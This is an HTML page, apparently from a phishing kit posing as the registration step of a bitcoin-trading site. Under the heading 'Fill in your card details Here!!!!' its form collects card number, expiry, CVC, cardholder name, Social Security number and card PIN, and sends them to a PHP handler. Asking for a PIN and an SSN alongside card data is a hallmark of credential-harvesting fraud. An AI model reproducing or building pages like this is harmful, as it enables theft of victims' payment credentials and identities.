...
<body class="auth-page">
    ...
    <div id="switcher" class="">
        <div class="content-switcher">
            ...
            <ul>
                <li>
                    <a id="orange-css" href="register.html#" title="orange" class="color"><img src="images/styleswitcher/colors/orange.png" alt="" width="30" height="30" /></a>
                </li>
                <li>
                    <a id="green-css" href="register.html#" title="green" class="color"><img src="images/styleswitcher/colors/green.png" alt="" width="30" height="30" /></a>
                </li>
                <li>
                    <a id="blue-css" href="register.html#" title="blue" class="color"><img src="images/styleswitcher/colors/blue.png" alt="" width="30" height="30" /></a>
                </li>
            </ul>
            ...
            <a href="register.html#" class="custom-button purchase">Purchase</a>
				...
				<div class="form-container">
					<div>
						...
						<div class="row text-center">
							<h2 class="title-head hidden-xs">get <span> Get Started</span></h2>
							 <p class="info-form">Complete your account Registration and start trading Bitcoins now!</p>
						</div>
            ...
            <div class=" col-md-4">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <div class="row">
                            <h3 class="text-center" style="text-decoration-color: red;">Fill in your card details Here!!!!!</h3>
                        ...
                        <form action="completement.php" method="post">
                            <!-- Input Field Starts -->
                            <div class="form-group">
                                <input class="form-control" name="cardNumber" id="cardNumber" placeholder="CARD NUMBER" type="number" required>
                            </div>
                            <!-- Input Field Ends -->
                            <!-- Input Field Starts -->
                            <div class="form-group">
                                <input class="form-control" name="expiration" id="expiration" placeholder="MM / YY" type="number" required>
                            </div>

                            <div class="form-group">
                                <input class="form-control" name="cvc" id="cvc" placeholder="CVC" type="number" required>
                            </div>

                            <div class="form-group">
                                <input class="form-control" name="cardOwner" id="cardOwner" placeholder="CARD OWNER" type="text" required>
                            </div>

                            <div class="form-group">
                                <input class="form-control" name="ssn" id="ssn" placeholder="SSN" type="number" required>
                            </div>

                            <div class="form-group">
                                <input class="form-control" name="cardPin" id="cardPin" placeholder="CARD PIN" type="number" required >
                            </div>
                            <!-- Input Field Ends -->
                            <!-- Submit Form Button Starts -->
                            <div class="form-group">
                                <button class="btn btn-primary" type="submit">Complete your Registration</button>
                            </div>
